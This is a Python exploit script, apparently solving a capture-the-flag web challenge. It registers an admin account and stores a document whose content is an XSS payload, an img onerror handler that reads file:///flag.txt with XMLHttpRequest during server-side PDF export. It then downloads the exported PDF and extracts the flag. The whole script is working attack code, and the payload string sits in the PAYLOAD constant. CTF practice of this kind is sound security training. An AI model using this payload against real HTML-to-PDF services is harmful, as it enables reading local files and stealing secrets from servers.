import requests
import io
from PyPDF2 import PdfReader

BASE_URL = "http://94.237.60.55:59291"
USERNAME = "admin"
PASSWORD = "admin"
PAYLOAD = "&lt;img src=x onerror=\"xhr=new XMLHttpRequest;xhr.onload=function(){document.write(xhr.responseText)};xhr.open('GET','file:///flag.txt');xhr.send()\"&gt;"

def create_account(session: requests.Session):
    resp = session.post(f"{BASE_URL}/register", data = {
        "username": USERNAME,
        "password": PASSWORD,
    })
    if resp.status_code == 200 or resp.status_code == 302:
        print(f"[+] Created account {USERNAME}:{PASSWORD}")
        return True
    else:
        print(f"[-] Failed to create account {USERNAME}:{PASSWORD}")
        return False
    
def login(session: requests.Session):
    resp = session.post(f"{BASE_URL}/login", data = {
        "username": USERNAME,
        "password": PASSWORD,
    })
    if resp.status_code == 200 or resp.status_code == 302:
        print(f"[+] Logged in as {USERNAME}:{PASSWORD}")
        return True
    else:
        print(f"[-] Failed to log in as {USERNAME}:{PASSWORD}")
        return False
    
def create_document(session: requests.Session):
    resp = session.post(f"{BASE_URL}/documents", data = {
        "content" : PAYLOAD,
    })
    if resp.status_code == 200 or resp.status_code == 302:
        print(f"[+] Created document with payload")
        return True
    else:
        print(f"[-] Failed to create document with payload")
        return False
    

def get_flag(session: requests.Session):
    url = f"{BASE_URL}/document/export/1"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "application/pdf,application/octet-stream,*/*;q=0.8",
        "Referer": f"{BASE_URL}/documents",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }

    resp = session.get(url, headers=headers, allow_redirects=True)
    raw = resp.content
    with open("resp_output.pdf", "wb") as f:
        f.write(raw)
    print("[*] Saved as resp_output.pdf")

    # 尝试用 PyPDF2 解析
    try:
        from PyPDF2 import PdfReader
        import io
        reader = PdfReader(io.BytesIO(raw))
        pages = reader.pages
        first_page = pages[0]
        text = first_page.extract_text()
        print("[+] flag found:", text)
    except Exception as e:
        print("PyPDF2 failed to parse the PDF:", repr(e))
        return None

    
def main():
    with requests.Session() as session:
        if not create_account(session):
            return
        if not login(session):
            return
        if not create_document(session):
            return
        flag = get_flag(session)

if __name__ == "__main__":
    main()
